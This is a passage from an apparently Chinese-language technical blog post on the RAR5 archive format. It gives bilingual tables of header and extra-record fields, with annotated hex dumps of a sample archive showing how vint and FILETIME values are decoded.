style="text-align:left"><code>可选字段</code>，数据区域，仅当设置了<code>0x02</code>头标志时才存在。如果是<code>文件头</code>，则存储文件数据；对于<code>服务头</code>，则存储服务数据。根据压缩方法中的值，可以对压缩信息进行未压缩（压缩方法0）或压缩。</td></tr></tbody></table><p>File and service headers use the same types of extra area records:<br><code>文件头</code>和<code>服务头</code>使用相同类型的扩展区域记录类型：</p><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">类型名称</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">0x01</td><td style="text-align:left">File encryption</td><td style="text-align:left">文件加密信息。</td></tr><tr><td style="text-align:left">0x02</td><td style="text-align:left">File hash</td><td style="text-align:left">文件数据哈希。</td></tr><tr><td style="text-align:left">0x03</td><td style="text-align:left">File time</td><td style="text-align:left">高精度文件时间。</td></tr><tr><td style="text-align:left">0x04</td><td style="text-align:left">File version</td><td style="text-align:left">文件版本号。</td></tr><tr><td style="text-align:left">0x05</td><td style="text-align:left">Redirection</td><td style="text-align:left">文件系统重定向。</td></tr><tr><td style="text-align:left">0x06</td><td style="text-align:left">Unix owner</td><td style="text-align:left">Unix所有者和组信息。</td></tr><tr><td style="text-align:left">0x07</td><td style="text-align:left">Service data</td><td style="text-align:left">服务头数据数组。</td></tr></tbody></table><p><strong><code>File encryption record(文件加密记录)</code></strong><br>This record is present if file data is encrypted.<br>如果<code>文件数据被加密</code>，则存在该记录。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code></td></tr><tr><td style="text-align:left">Version</td><td style="text-align:center">vint</td><td style="text-align:left">加密算法的版本。现在仅支持<code>0版本</code>(AES-256)。</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - 存在密码验证数据。<br> <code>0x02</code> - 使用调整过的校验和而不是普通校验和。<br> 如果存在标志<code>0x02</code>，则RAR转换保留的校验和文件或服务数据的完整性，因此它取决于加密密钥。它使得不可能根据校验和猜测文件内容。它会影响文件头中的数据CRC32和扩展区域中文件哈希记录中的校验和。</td></tr><tr><td style="text-align:left">KDF count</td><td style="text-align:center">1 byte</td><td style="text-align:left"><code>PBKDF2函数</code>的迭代数的<code>二进制对数</code>。 RAR可以拒绝处理超过<code>某个阈值</code>的KDF计数。阈值的具体值取决于<code>版本</code>。</td></tr><tr><td style="text-align:left">Salt</td><td style="text-align:center">16 byte</td><td style="text-align:left">设置加密文件<code>解密密钥</code>的盐值。</td></tr><tr><td style="text-align:left">IV</td><td style="text-align:center">16 byte</td><td style="text-align:left">AES-256<code>初始化向量</code>。</td></tr><tr><td style="text-align:left">Check value</td><td style="text-align:center">12 byte</td><td style="text-align:left"><code>可选字段</code>，用于验证密码有效性的值。仅当设置了<code>0x01</code>加密标志时才存在。<code>前8个字节</code>是使用额外的PBKDF2轮次计算的，<code>最后4个字节</code>是额外的校验和。与标准<code>Header CRC32</code>一起，我们具有<code>64位校验和</code>，以可靠地<code>验证此字段的完整性</code>并区分<code>无效的密码</code>和<code>损坏的数据</code>。可以在UnRAR源代码中找到更多详细信息。</td></tr></tbody></table><p><strong><code>File hash record(文件哈希记录)</code></strong><br>&emsp;&emsp;Only the standard CRC32 checksum can be stored directly in file header. If other hash is used, it is stored in this extra area record:<br>&emsp;&emsp;仅<code>标准CRC32校验和</code>可以直接存储在<code>文件头</code>中。如果使用<code>其他哈希</code>，它将存储在此<code>扩展区域记录</code>中：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x02</code></td></tr><tr><td style="text-align:left">Hash type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x00</code> - BLAKE2sp哈希函数。</td></tr><tr><td style="text-align:left">Hash data</td><td style="text-align:center">N bytes</td><td style="text-align:left"><code>0x00哈希类型</code>的32个字节的BLAKE2sp哈希值。</td></tr></tbody></table><p>&emsp;&emsp;For files split between volumes it contains a hash of file packed data contained in current volume for all file parts except the last. For files not split between volumes and for last parts of split files it contains an unpacked data hash.<br>&emsp;&emsp;对于<code>在卷之间分割</code>的文件，它包含当前卷中除最后文件部分以外的所有文件部分所包含的文件压缩数据的哈希。对于<code>未在卷之间拆分</code>的文件以及拆分文件的最后部分，它包含未压缩的数据哈希。</p><p><strong><code>File time record(文件时间记录)</code></strong><br>&emsp;&emsp;This record is used if it is necessary to store creation and last access time or if 1 second precision of Unix mtime stored in file header is not enough:<br>&emsp;&emsp;如果需要存储<code>创建</code>和<code>上次访问</code>时间，或者<code>文件头</code>中存储的Unix mtime的1秒<code>精度不够</code>，则使用此记录：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x03</code></td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - 如果设置了此标志，则时间以Unix time_t格式存储，否则以Windows FILETIME格式存储。<br> <code>0x02</code> - 存在“mtime”字段。<br> <code>0x04</code> - 存在“ctime”字段。<br> <code>0x08</code> - 存在“atime”字段。<br> <code>0x10</code> - Unix时间格式，具有纳秒级精度。</td></tr><tr><td style="text-align:left">mtime</td><td style="text-align:center">uint32 or uint64</td><td style="text-align:left"><code>修改时间</code>。如果设置了<code>0x02</code>标志，则存在。根据<code>0x01</code>，标志可以采用Unix time_t或Windows FILETIME格式。</td></tr><tr><td style="text-align:left">ctime</td><td style="text-align:center">uint32 or uint64</td><td style="text-align:left"><code>创建时间</code>。如果设置了<code>0x04</code>标志，则存在。根据<code>0x01</code>，标志可以采用Unix time_t或Windows FILETIME格式。</td></tr><tr><td style="text-align:left">atime</td><td style="text-align:center">uint32 or uint64</td><td style="text-align:left"><code>上次访问时间</code>。如果设置了<code>0x08</code>标志，则存在。根据<code>0x01</code>，标志可以采用Unix time_t或Windows FILETIME格式。</td></tr><tr><td style="text-align:left">mtime nanoseconds</td><td style="text-align:center">uint32</td><td style="text-align:left">添加到<code>mtime</code>的纳秒值。如果<code>0x01</code>、<code>0x02</code>和<code>0x10</code>标志都设置了，则存在。</td></tr><tr><td style="text-align:left">ctime nanoseconds</td><td style="text-align:center">uint32</td><td style="text-align:left">添加到<code>ctime</code>的纳秒值。如果<code>0x01</code>、<code>0x04</code>和<code>0x10</code>标志都设置了，则存在。</td></tr><tr><td style="text-align:left">atime nanoseconds</td><td style="text-align:center">uint32</td><td style="text-align:left">添加到<code>atime</code>的纳秒值。如果<code>0x01</code>、<code>0x08</code>和<code>0x10</code>标志都设置了，则存在。</td></tr></tbody></table><p><strong><code>File version record(文件版本记录)</code></strong><br>This record is used in archives created with -ver switch.<br>该记录用于通过<code>-ver开关</code>创建的压缩文档中。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x04</code></td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left">尚未定义文件版本标志，因此将其设置为0。</td></tr><tr><td style="text-align:left">Version number</td><td style="text-align:center">vint</td><td style="text-align:left">文件版本号。</td></tr></tbody></table><p><strong><code>File system redirection record(文件系统重定向记录)</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x05</code></td></tr><tr><td style="text-align:left">Redirection type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - Unix符号链接 <br> <code>0x02</code> - Windows符号链接 <br> <code>0x03</code> - Windows交接点 <br> <code>0x04</code> - 硬链接 <br> <code>0x05</code> - 文件复制</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - 链接目标为目录</td></tr><tr><td style="text-align:left">Name length</td><td style="text-align:center">vint</td><td style="text-align:left">链接目标名称的长度</td></tr><tr><td style="text-align:left">Name</td><td style="text-align:center">vint</td><td style="text-align:left"><code>UTF-8</code>格式的链接目标名称，不以0结尾</td></tr></tbody></table><p><strong><code>Unix owner record(Unix所有者记录)</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x06</code></td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - “User name”符串存在 <br> <code>0x02</code> - “Group name”字符串存在 <br> <code>0x04</code> - 存在数字“User ID” <br> <code>0x08</code> - 存在数字“Group ID”</td></tr><tr><td style="text-align:left">User name length</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，所有者用户名的长度。如果设置了<code>0x01</code>标志，则存在。</td></tr><tr><td style="text-align:left">User name</td><td style="text-align:center">N bytes</td><td style="text-align:left"><code>可选字段</code>，所有者用户名（采用本机编码）。非零终止。如果设置了<code>0x01</code>标志，则存在。</td></tr><tr><td style="text-align:left">Group name length</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，所有者组名称的长度。如果设置了<code>0x02</code>标志，则存在。</td></tr><tr><td style="text-align:left">Group name</td><td style="text-align:center">N bytes</td><td style="text-align:left"><code>可选字段</code>，所有者组名称（采用本机编码）。非零终止。如果设置了<code>0x02</code>标志，则存在。</td></tr><tr><td style="text-align:left">User ID</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数字所有者用户ID。如果设置了<code>0x04</code>标志，则存在。</td></tr><tr><td style="text-align:left">Group ID</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数字所有者组ID。如果设置了<code>0x08</code>标志，则存在。</td></tr></tbody></table><p><strong><code>Service data record(服务数据记录)</code></strong><br>This record is used only by service headers to store additional parameters.<br>该记录仅由<code>服务头</code>使用，以存储其他参数。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x07</code></td></tr><tr><td style="text-align:left">Data</td><td style="text-align:center">N bytes</td><td style="text-align:left">服务数据的具体内容取决于<code>服务头类型</code>。</td></tr></tbody></table><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/File header.jpg" alt="文件头"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">00310850 - 00311002</span><br><span class="line">FF A6 73 44 - Header CRC32( Header size -&gt; Extra area )</span><br><span class="line">93 01 - Header size( Header <span class="built_in">type</span> -&gt; Extra area )</span><br><span class="line">02 - Header <span class="built_in">type</span>( 文件头 )</span><br><span class="line">03 - Header flags( 0x03 = 0x01 + 0x02 )</span><br><span class="line">6F - Extra area size[ 0x6F = (0x30+0x01) + (0x22+0x01) + (0x1A+0x01) ]</span><br><span class="line">D0 C5 01 - Data area size</span><br><span class="line">00 - File flags                       ‭  </span><br><span class="line">B3 E9 - Unpacked size </span><br><span class="line">01 20 - Attributes    </span><br><span class="line">80 03 - Compression information</span><br><span class="line">00 - Host OS</span><br><span class="line">15 - Name length( 15H = 21D )</span><br><span class="line">32 30 32 30 30 32 30 35 31 31 34 36 31 34 39 34 35 2E 70 6E 67 - Name</span><br><span class="line">30 - Size( Extra area ) 30H = 48D</span><br><span class="line">01 - Type( 文件加密记录 )</span><br><span class="line">00 - Version</span><br><span class="line">03 - Flags( 0x03 = 0x02 + 0x01 )</span><br><span class="line">0F - KDF count</span><br><span class="line">48 2F 76 C7 97 E7 8A 77 D5 55 F8 1F 5F 31 D8 26 - Salt</span><br><span class="line">5C 4C 4F B0 4F 94 01 90 95 95 2E E9 E6 BF 8F 75 - IV</span><br><span class="line">4D 87 A2 57 6C EA BA B2 EB D6 4E A8 - Check value</span><br><span class="line">22 - Size( Extra area ) 22H = 34D</span><br><span class="line">02 - Type( 文件哈希记录 )</span><br><span class="line">00 - Hash <span class="built_in">type</span></span><br><span class="line">16 87 E7 C4 D1 8C 13 AA BD B5 18 4A A9 C7 3E D1 85 85 95 B4 6F 12 3E 55 10 C6 86 7C 5A 2E 80 B9 - Hash data</span><br><span class="line">1A - Size( Extra area ) 1AH = 26D</span><br><span class="line">03 - Type( 文件时间记录 )</span><br><span class="line">0E - Flags( 0x0E = 0x02 + 0x04 + 0x08 )</span><br><span class="line">8C E5 A3 8C 2A 01 D6 01 - mtime</span><br><span class="line">7D A3 8E 8E 2A 01 D6 01 - ctime</span><br><span class="line">87 27 7A 12 2D 2D D6 01 - atime                           </span><br><span class="line">Data area: 00311003 - 00336298  25296B(压缩后大小)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Note: vint类型的数据，如果是多字节的，前几个字节的最高位为连续标志</span><br><span class="line">(设为1)，低7位为数据，最后一个字节的最高位为0，低7位依旧是数据。所</span><br><span class="line">以我们需要提取出数据，进行重新组合，才能得到“Quick open header”</span><br><span class="line">和“Recovery record”真实偏移。</span><br><span class="line">1、Header size</span><br><span class="line">0x0193( 00000001 10010011 )</span><br><span class="line">0000001 0010011B = 10010011B = 93H = 147D</span><br><span class="line">2、Data area size</span><br><span class="line">0x01C5D0( 00000001 ‭11000101 11010000‬ )</span><br><span class="line">0000001 1000101 1010000‬B = 01100010 11010000‬B = 62D0H = 25296D</span><br><span class="line">3、Unpacked size</span><br><span class="line">0xE9B3( ‭11101001 10110011‬ )</span><br><span class="line">11101001 0110011B = ‬01110100 10110011B = 74B3H = ‭29875‬D</span><br><span class="line">4、Compression information</span><br><span class="line">0x0380( 00000011 10000000 )</span><br><span class="line">0000011 0000000B = 0000 011 0 000000B</span><br><span class="line">( 0000 - 字典大小128KB、011 - 标准压缩、0 - solid flag、000000 - 压缩算法版本 )</span><br><span class="line">5、FILETIME</span><br><span class="line">(1)https://support.microsoft.com/zh-cn/<span class="built_in">help</span>/188768/info-working-with-the-filetime-structure</span><br><span class="line">(2)https://www.pressc.cn/123.html</span><br><span class="line">(3)http://www.beijing-time.org/riqi.htm</span><br><span class="line">ctime</span><br><span class="line">7D A3 8E 8E 2A 01 D6 01  2020/05/19 00:24:42</span><br><span class="line">dwLowDateTime dwHighDateTime   </span><br><span class="line">0x8E8EA37D    0x01D6012A</span><br><span class="line">0x01D6012A8E8EA37D = ‭132294521345975165‬</span><br><span class="line">153175.0039699074*24*60*60*10000000 = 132343203429999993.6‬</span><br><span class="line">42*10000000 + 24*60*10000000 = 14820000000‬</span><br><span class="line">132343203429999993.6‬ + 14820000000‬ = 132343218249999993.6</span><br><span class="line">                                     132294521345975165‬</span><br><span class="line">----------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h5 id="2-2-3-6、Recovery-record-恢复记录"><a href="#2-2-3-6、Recovery-record-恢复记录" class="headerlink" title="2.2.3.6、Recovery record(恢复记录)"></a>2.2.3.6、<strong><code>Recovery record(恢复记录)</code></strong></h5><p>&emsp;&emsp;加入冗余数据用于修复，在<code>压缩包本身损坏</code>但<code>恢复记录够多</code>时可对损坏压缩包进行恢复。<br><strong><code>实例：</code></strong><br>我们可以从例子RAR环境的图片中看到,恢复记录的大小约为19.6KB。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">336483 - 356643  (20161B 恢复记录)</span><br><span class="line">20161B/1024 = 19.6KB</span><br></pre></td></tr></table></figure></p><h5 id="2-2-3-7、End-of-archive-header-结尾块"><a href="#2-2-3-7、End-of-archive-header-结尾块" class="headerlink" title="2.2.3.7、End of archive header(结尾块)"></a>2.2.3.7、<strong><code>End of archive header(结尾块)</code></strong></h5><p>&emsp;&emsp;End of archive marker. RAR does not read anything after this header letting to use third party tools to add extra information such as a digital signature to archive.<br>&emsp;&emsp;标记<code>压缩文档结束</code>。 RAR在此头之后不读取任何内容，从而允许使用<code>第三方工具</code>来添加<code>扩展的信息</code>，例如<code>压缩文档的数字签名</code>。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>End of archive flags</code>”字段。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>End of archive flags</code>”字段。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x05</code></td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">End of archive flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x00</code> - 压缩文档不使用卷分割。或是集合中的最后一个卷。 <br> <code>0x01</code> - 压缩文档是卷，不是集合中的最后一个卷。</td></tr></tbody></table><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/End of archive header.jpg" alt="结尾块"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00356644 - 00356651</span><br><span class="line">1D 77 56 51 - Header CRC32( Header size -&gt; End of archive flags )</span><br><span class="line">03 - Header size( Header size -&gt; End of archive flags ) 03H = 3D</span><br><span class="line">05 - Header <span class="built_in">type</span>( 结尾块 )</span><br><span class="line">04 - Header flags( 0x04 )</span><br><span class="line">00 - End of archive flags</span><br></pre></td></tr></table></figure><h4 id="2-2-4、Service-headers-服务头"><a href="#2-2-4、Service-headers-服务头" class="headerlink" title="2.2.4、Service headers(服务头)"></a>2.2.4、Service headers(服务头)</h4><p>&emsp;&emsp;RAR uses service headers based on the file header data structure to store different supplementary information.<br>&emsp;&emsp;RAR使用基于<code>文件头数据结构</code>的<code>服务头</code>来存储不同的补充信息。</p><h5 id="2-2-4-1、Archive-comment-header-压缩文档注释服务头"><a href="#2-2-4-1、Archive-comment-header-压缩文档注释服务头" class="headerlink" title="2.2.4.1、Archive comment header(压缩文档注释服务头)"></a>2.2.4.1、<strong><code>Archive comment header(压缩文档注释服务头)</code></strong></h5><p>&emsp;&emsp;Optional header storing the main archive comment. Contains CMT identifier in file name field. Placed before any file headers and after the main archive header. Comment data is stored in UTF-8 immediately after the archive comment header. Now RAR does not use compression for archive comments, so packed and unpacked data sizes in header are equal and they both define the comment data size. Compression method in header is set to 0.<br>&emsp;&emsp;可选的头，用于存储<code>压缩文档注释</code>。在<code>文件名字段</code>中包含<code>CMT标识符</code>。放在<code>任何文件头</code>之前和<code>压缩文档头</code>之后。<code>注释数据</code>在<code>压缩文档注释头</code>之后用UTF-8存储。现在，RAR不对<code>压缩文件注释</code>使用压缩，因此头中的<code>压缩数据大小</code>和<code>未压缩数据大小</code>相等，并且它们都定义了<code>注释数据大小</code>。头中的<code>压缩方法</code>设置为0。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/Archive comment header.jpg" alt="压缩文档注释服务头"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">00310812 - 00310849</span><br><span class="line">EF 0D 46 57 - Header CRC32( Header size -&gt; Name )</span><br><span class="line">13 - Header size( Header <span class="built_in">type</span> -&gt; Name ) 13H = 19B</span><br><span class="line">03 - Header <span class="built_in">type</span>( 服务头 )</span><br><span class="line">02 - Header flags( 0x02 )</span><br><span class="line">8E 00 - Data area size</span><br><span class="line">04 - File flags( 0x04 )</span><br><span class="line">8E 00 - Unpacked size</span><br><span class="line">00 - Attributes</span><br><span class="line">F5 88 A4 AC - Data CRC32( 77 77 77 2E 62 61 69 64 75 2E 63 6F 6D 00 )</span><br><span class="line">80 00 - Compression information</span><br><span class="line">00 - Host OS</span><br><span class="line">03 - Name length( 03H = 3D )</span><br><span class="line">43 4D 54 - Name( CMT - 压缩文档注释 )                                                          </span><br><span class="line">77 77 77 2E 62 61 69 64 75 2E 63 6F 6D 00 - Data area( www.baidu.com )</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Note: vint类型的数据，如果是多字节的，前几个字节的最高位为连续标志</span><br><span class="line">(设为1)，低7位为数据，最后一个字节的最高位为0，低7位依旧是数据。所</span><br><span class="line">以我们需要提取出数据，进行重新组合，才能得到“Quick open header”</span><br><span class="line">和“Recovery record”真实偏移。</span><br><span class="line">1、Data size &amp;&amp; Unpacked size</span><br><span class="line">0x008E( 00000000 10001110 )</span><br><span class="line">0001110B = 00001110B = EH = 14D</span><br><span class="line">2、Compression information</span><br><span class="line">0x0080( 00000000 10000000 )</span><br><span class="line">0000000 0000000B = 0000 000 0 000000B</span><br><span class="line">( 0000 - 字典大小128KB、000 - 存储、0 - solid flag、000000 - 压缩算法版本 )</span><br><span class="line">----------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h5 id="2-2-4-2、Quick-open-header-快速打开服务头"><a href="#2-2-4-2、Quick-open-header-快速打开服务头" class="headerlink" title="2.2.4.2、Quick open header(快速打开服务头)"></a>2.2.4.2、<strong><code>Quick open header(快速打开服务头)</code></strong></h5><p>&emsp;&emsp;Optional header storing the quick open record. Contains QO identifier in file name field. Placed after all file headers, but before the recovery record and end of archive header. It is possible to locate the quick open header with locator record in main archive header.<br>&emsp;&emsp;可选的头，用于存储<code>快速打开记录</code>。在<code>文件名</code>字段中包含<code>QO标识符</code>。置于<code>所有文件头</code>之后，但在<code>恢复记录</code>和<code>压缩文档结尾块</code>之前。可以在<code>压缩文档头</code>中找到带有定位记录的<code>快速打开头</code>。<br>&emsp;&emsp;Quick open record data is stored immediately after the quick open header. RAR does not use compression for quick open data, so packed and unpacked data sizes in header are equal and they both define the quick open data size. Compression method in header is set to 0.<br>&emsp;&emsp;<code>快速打开记录数据</code>将立即存储在<code>快速打开头</code>之后。 RAR不对<code>快速打开数据</code>使用压缩，因此头中的<code>压缩数据大小</code>和<code>未压缩数据大小</code>相等，并且它们都定义了<code>快速打开数据大小</code>。头中的压缩方法设置为0。<br>&emsp;&emsp;Quick open data is the array consisting of data cache structures. Every data cache structure stores a portion of archived data and has the following format:<br>&emsp;&emsp;<code>快速打开数据</code>是由<code>数据缓存结构</code>组成的数组。<code>每个数据缓存结构</code>都存储<code>一部分压缩数据</code>，并具有以下格式：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Structure CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">从“<code>Structure size</code>”字段开始的结构数据的<code>CRC32</code>。</td></tr><tr><td style="text-align:left">Structure size</td><td style="text-align:center">vint</td><td style="text-align:left">从<code>标志字段</code>开始的结构数据的大小。在当前实现中，该字段不得超过<code>3个字节</code>，因此最大大小为<code>2 MB</code>。</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left">当前设置为0。</td></tr><tr><td style="text-align:left">Offset</td><td style="text-align:center">vint</td><td style="text-align:left">从<code>快速打开头的开始</code>到当前结构中缓存的<code>压缩文档数据的开始</code>的偏移量。我们可以使用该值来计算存储当前结构的<code>压缩数据的绝对位置</code>。从结构数组的开头到结尾，可以保证数据缓存结构引用的绝对存档位置始终在增长。</td></tr><tr><td style="text-align:left">Data size</td><td style="text-align:center">vint</td><td style="text-align:left">当前结构中存储的<code>压缩文档数据的大小</code>。</td></tr><tr><td style="text-align:left">Data</td><td style="text-align:center">N bytes</td><td style="text-align:left">存储在当前结构中的<code>压缩文档数据</code>。</td></tr></tbody></table><p>&emsp;&emsp;Normally RAR uses the quick open data to store copies of file and service headers. It can store either all headers or only a part of them. If required header is missing in quick open data or if structure CRC32 is invalid, data are read from its original archive position.<br>&emsp;&emsp;通常，RAR使用<code>快速打开数据</code>来存储<code>文件的副本</code>和<code>服务头</code>。它可以存储<code>所有头</code>，也可以只存储<code>其中的一部分</code>。如果快速打开数据中<code>缺少必需的标头</code>，或者结构<code>CRC32无效</code>，则从其<code>原始存档位置</code>读取数据。<br>&emsp;&emsp;Using the quick open data is optional. You can skip it completely and read only standard archive headers. But it is important to use the same access pattern when reading file names to display them to user and to extract files. Otherwise it would be possible to see one file name and extract another in case the quick open data and real archive data are intentionally created different. It could introduce a security threat. So if you use the quick open data when displaying the archive contents, use it when extracting. If you do not use it when displaying the archive contents, do not use it when extracting.<br>&emsp;&emsp;使用<code>快速打开数据</code>是可选的。您可以完全跳过它，而仅读取<code>标准压缩文档头</code>。但是，重要的是在<code>读取文件名</code>时使用相同的访问模式以将其<code>显示给用户</code>并<code>提取文件</code>。否则，如果有意创建的<code>快速打开数据</code>和<code>实际存档数据</code>不同，则可能会看到<code>一个文件名</code>并提取<code>另一个文件名</code>。它可能会带来安全威胁。因此，如果在<code>显示存档内容时</code>使用快速打开的数据，请在<code>提取时</code>使用它。如果在<code>显示存档内容时</code>不使用它，则在<code>提取时</code>不要使用它。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/Quick open header.jpg" alt="快速打开服务头"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 